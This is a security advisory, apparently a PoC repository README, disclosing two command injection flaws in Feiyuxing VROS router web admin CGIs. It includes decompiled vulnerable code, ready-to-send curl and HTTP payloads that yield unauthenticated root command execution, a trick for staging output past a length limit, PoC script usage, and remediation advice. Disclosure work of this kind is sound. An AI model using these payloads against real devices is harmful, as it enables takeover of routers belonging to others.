# Feiyuxing VROS (VW2100 / VEC10GP) — unauthenticated root command injection

Two OS command injection vulnerabilities in the web admin CGI
(`var/html/webserver`) of Feiyuxing VROS-based routers. The first one is
**unauthenticated** and yields **remote code execution as root**.

> Research / educational purpose only. Only test devices you own or are
> explicitly authorized to test.

## Affected products

* Chengdu Feiyuxing Technology (飞鱼星) VW2100 V1.0 / VEC10GP V1.0, VROS
* Firmware analyzed: `B-MB3W202-210825-r11775`
* Other VROS builds sharing the `webserver` CGI may be affected

The web admin is served by a vendor-patched thttpd that dispatches every
`*.cgi` URL to the `webserver` CGI binary, passing the URL script name
(without `.cgi`) as `argv[1]`.

## VULN-1 — `weixin_auth` (unauthenticated, CVSS 9.8)

`main()` whitelists `argv[1] == "weixin_auth"` in its "skip session
check" branch, so no cookie/login is needed. The handler builds a shell
command from the `extend` parameter:

```c
/* handle_wechat_cn_wifi @ 0x4D2B70 */
extend = procgi("extend", LoadInput());
if (!memcmp(extend, "volanswechatconnwifi", 20)) {
    /* 17 bytes of extend[20..36] copied into a local buffer */
    snprintf(cmd, 512,
        "echo 'weixin_authed %s %d' > /proc/weixin_config &",
        buf, inet_addr(getenv("REMOTE_ADDR")));
    system(cmd);                          /* @ 0x4D2DF8 — no escaping */
}
```

The attacker-controlled 17 bytes sit inside single quotes: a leading `'`
breaks out, `;` starts a new command, `#` comments the rest.

```bash
curl -i -X POST 'http://<TARGET>:<PORT>/weixin_auth.cgi' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data "extend=volanswechatconnwifi';id;#"
```

The command window after `volanswechatconnwifi` is 17 bytes
(`';CMD;#'`, CMD ≤ 13 chars). For longer output, stage to a file and
read it back:

```bash
# write
... --data "extend=volanswechatconnwifi';id>/tmp/p;#"
# read
... --data "extend=volanswechatconnwifi';cat</tmp/p;#"
```

Observed response (firmware `B-MB3W202-210825-r11775`, no cookie):

```
weixin_authed
uid=0(root) gid=0(root)
{"type":1,"msg":"ok"}
```

## VULN-2 — `swifi_exip` (CVSS 9.8 unauth / 8.8 with session)

```c
/* sub_4A2C4C @ 0x4A2C4C */
snprintf(cmd, 1024, "/usr/sbin/swifi.sh add_ip_expt %s >/dev/null 2>&1 ",
         exip);
system(cmd);                              /* @ 0x4A2E44 */
```

```http
POST /send_order.cgi?parameter=swifi_exip HTTP/1.1
Content-Type: application/x-www-form-urlencoded; charset=UTF-8

{"opera":"add","exip":";id;#"}
```

On the r11775 build `send_order` is gated by a session cookie; earlier
firmware builds lack that gate, so the same request is an
unauthenticated root RCE (verified on a live device). Sibling handlers
(`swifi_exmac`, `del_swifimac`, `swifi_exIp_batch_set`) share the same
pattern.

## PoC usage

```bash
# VULN-1: unauthenticated
python3 poc_weixin_auth.py <IP> <PORT> -c 'id'

# VULN-2: unauthenticated (older builds) / after login on r11775
python3 poc_swifi_exip.py <IP> <PORT> -c 'id'
python3 poc_swifi_exip.py <IP> <PORT> -p '<password>' -c 'id'
```

Both scripts are dependency-free (raw sockets).

## Remediation

* Validate `extend` as a MAC address and the `swifi_*` arguments as
  well-formed IP/MAC values before use.
* Never build shell strings from request data — use `execve()` with an
  argument vector.
* Restrict the web admin port to the LAN.
* The session gate on newer builds does **not** fix VULN-1.

## Credit

Discovered by `<your-handle>`. CVE requested (reference pending).

## Timeline

* 2026-10-15 — discovery, analysis and verification
* 2026-10-15 — submitted for CVE assignment; writeup prepared
